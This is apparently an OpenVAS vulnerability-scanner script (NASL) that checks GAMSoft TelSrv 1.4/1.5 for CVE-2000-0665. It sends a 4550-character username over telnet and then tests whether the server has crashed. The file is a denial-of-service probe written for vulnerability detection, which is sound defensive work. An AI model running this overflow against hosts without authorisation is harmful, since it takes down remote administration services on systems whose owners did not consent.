# OpenVAS Vulnerability Test
# $Id: TelSrv_DoS.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: GAMSoft TelSrv 1.4/1.5 Overflow
#
# Authors:
# Prizm <Prizm@RESENTMENT.org>
# Changes by rd: 
# - description changed somehow
# - handles the fact that the shareware may not be registered
#
# Copyright:
# Copyright (C) 2000 Prizm <Prizm@RESENTMENT.org
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "It is possible to crash the remote telnet server by
sending a username that is 4550 characters long.

An attacker may use this flaw to prevent you
from administering this host remotely.";

tag_solution = "Contact your vendor for a patch.";

if(description) {
    script_oid("1.3.6.1.4.1.25623.1.0.10474");
    script_version("$Revision: 9348 $");
    script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
    script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
    script_bugtraq_id(1478);
    script_tag(name:"cvss_base", value:"5.0");
    script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
    script_cve_id("CVE-2000-0665");
    name = "GAMSoft TelSrv 1.4/1.5 Overflow";
    script_name(name);




    summary = "Crash GAMSoft TelSrv telnet server.";

    script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");

    script_copyright("This script is Copyright (C) 2000 Prizm <Prizm@RESENTMENT.org");
    family = "Denial of Service";
    script_family(family);
    script_dependencies("find_service.nasl");
    script_require_ports("Services/telnet", 23);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    exit(0);
}
include('telnet_func.inc');
port = get_kb_item("Services/telnet");
if(!port)port = 23;
if(!get_port_state(port))exit(0);

soc = open_sock_tcp(port);
if(soc)
{
  r = telnet_negotiate(socket:soc);
  r2 = recv(socket:soc, length:4096);
  r = r + r2;
  if(r)
  {
  r = recv(socket:soc, length:8192);
  if("5 second delay" >< r)sleep(5);
  r = recv(socket:soc, length:8192);
  req = string(crap(4550), "\r\n");
  send(socket:soc, data:req);
  close(soc);
  sleep(1);

  soc2 = open_sock_tcp(port);
  if(!soc2)security_message(port);
  else {
        r = telnet_negotiate(socket:soc2);
	r2 = recv(socket:soc2, length:4096);
	r = r + r2;
        close(soc2);
        if(!r)security_message(port);
      }
  }  
}

